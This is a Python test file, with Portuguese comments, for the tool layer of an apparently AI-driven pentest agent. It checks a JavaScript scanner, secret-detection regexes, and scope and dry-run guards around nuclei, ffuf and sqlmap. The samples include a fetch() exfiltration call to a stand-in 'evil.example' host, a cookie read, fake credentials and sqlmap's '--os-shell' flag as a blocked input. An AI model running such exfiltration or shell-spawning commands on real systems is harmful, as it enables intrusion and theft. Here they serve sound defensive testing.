"""Testa as tools diretamente: analise AST, wrappers externos (gated/dry-run)
e verify_finding. Nada aqui toca a rede real nem spawna um binario de verdade."""
from hackbot.budget import Budget
from hackbot.config import Settings, TargetScope
from hackbot.tools import _ast_scan, _regex_secret_hits, make_tools


def _mk(dry_run: bool = True, enable_external: bool = False):
    settings = Settings(
        dry_run=dry_run,
        require_authorization=False,
        enable_external_tools=enable_external,
    )
    scope = TargetScope(allowed_hosts=["localhost"], allowed_paths=["/*"], authorized_by="x")
    budget = Budget(max_steps=50, max_requests=50, max_tokens=100_000)
    findings: list = []
    actions: list = []
    tools = {t.name: t for t in make_tools(settings, scope, budget, findings, actions)}
    return tools, findings, actions, budget


# ---------------------------------------------------------------------------
# AST / regex analysis (pure functions, no I/O)
# ---------------------------------------------------------------------------

def test_ast_scan_detects_eval():
    hits = _ast_scan("eval('2+2');")
    assert any("eval" in h for h in hits)


def test_ast_scan_detects_document_cookie():
    hits = _ast_scan("var c = document.cookie;")
    assert any("document.cookie" in h for h in hits)


def test_ast_scan_detects_network_call():
    hits = _ast_scan("fetch('https://evil.example/exfil', {method:'POST'});")
    assert any("fetch" in h for h in hits)


def test_ast_scan_detects_embedded_secret_literal():
    hits = _ast_scan("var key = 'AKIAABCDEFGHIJKLMNOP';")
    assert any("aws_akid" in h for h in hits)


def test_ast_scan_handles_invalid_js_gracefully():
    hits = _ast_scan("this is not { valid js at all +++ ")
    assert isinstance(hits, list)  # never raises, always returns a list


def test_regex_secret_hits_card_and_jwt():
    text = "card 4111111111111111 jwt eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVP"
    hits = _regex_secret_hits(text)
    assert any("card" in h for h in hits)
    assert any("jwt" in h for h in hits)


# ---------------------------------------------------------------------------
# External tool wrappers: gated by enable_external_tools, scope-guarded,
# dry-run aware, no real subprocess ever spawned in these assertions.
# ---------------------------------------------------------------------------

async def test_nuclei_disabled_by_default():
    tools, *_ = _mk(dry_run=True, enable_external=False)
    r = await tools["nuclei_scan"].ainvoke({"url": "http://localhost:3000/"})
    assert "DESABILITADO" in r


async def test_nuclei_dry_run_when_enabled():
    tools, _findings, _actions, budget = _mk(dry_run=True, enable_external=True)
    r = await tools["nuclei_scan"].ainvoke({"url": "http://localhost:3000/"})
    assert "DRY_RUN" in r
    assert budget.requests == 0


async def test_nuclei_scope_violation_blocks_even_when_enabled():
    tools, *_ = _mk(dry_run=True, enable_external=True)
    r = await tools["nuclei_scan"].ainvoke({"url": "http://evil.com/"})
    assert "VIOLACAO" in r


async def test_ffuf_disabled_by_default():
    tools, *_ = _mk(dry_run=True, enable_external=False)
    r = await tools["ffuf_scan"].ainvoke({"url": "http://localhost:3000/", "wordlist": "w.txt"})
    assert "DESABILITADO" in r


async def test_ffuf_appends_fuzz_marker_when_missing():
    tools, *_ = _mk(dry_run=True, enable_external=True)
    r = await tools["ffuf_scan"].ainvoke({"url": "http://localhost:3000/", "wordlist": "w.txt"})
    assert "FUZZ" in r


async def test_sqlmap_disabled_by_default():
    tools, *_ = _mk(dry_run=True, enable_external=False)
    r = await tools["sqlmap_scan"].ainvoke({"url": "http://localhost:3000/?id=1"})
    assert "DESABILITADO" in r


async def test_sqlmap_blocks_dangerous_flags():
    tools, *_ = _mk(dry_run=True, enable_external=True)
    r = await tools["sqlmap_scan"].ainvoke(
        {"url": "http://localhost:3000/?id=1", "extra_args": "--os-shell"}
    )
    assert "BLOQUEADO" in r


async def test_sqlmap_dry_run_forces_safe_risk_level():
    tools, *_ = _mk(dry_run=True, enable_external=True)
    r = await tools["sqlmap_scan"].ainvoke(
        {"url": "http://localhost:3000/?id=1", "extra_args": "--risk=3 --level=5"}
    )
    assert "DRY_RUN" in r
    assert "--risk=1" in r
    assert "--level=1" in r
    assert "--risk=3" not in r
    assert "--level=5" not in r


# ---------------------------------------------------------------------------
# verify_finding: never auto-registers unless the PoC actually matched.
# ---------------------------------------------------------------------------

async def test_verify_finding_requires_an_expectation():
    tools, findings, *_ = _mk(dry_run=True)
    r = await tools["verify_finding"].ainvoke(
        {"title": "t", "severity": "LOW", "url": "http://localhost:3000/"}
    )
    assert "ERRO" in r
    assert len(findings) == 0


async def test_verify_finding_not_saved_in_dry_run():
    tools, findings, *_ = _mk(dry_run=True)
    r = await tools["verify_finding"].ainvoke(
        {
            "title": "t",
            "severity": "LOW",
            "url": "http://localhost:3000/",
            "expected_status": 200,
        }
    )
    assert "NAO_VERIFICADO" in r
    assert len(findings) == 0


async def test_verify_finding_scope_violation_not_saved():
    tools, findings, *_ = _mk(dry_run=True)
    r = await tools["verify_finding"].ainvoke(
        {
            "title": "t",
            "severity": "LOW",
            "url": "http://evil.com/",
            "expected_status": 200,
        }
    )
    assert "VIOLACAO" in r
    assert len(findings) == 0


async def test_save_finding_marks_unverified():
    tools, findings, *_ = _mk(dry_run=True)
    r = await tools["save_finding"].ainvoke(
        {"title": "t", "severity": "low", "evidence": "ev", "url": "http://localhost:3000/"}
    )
    assert "nao verificado" in r.lower()
    assert len(findings) == 1
    assert findings[0]["verified"] is False
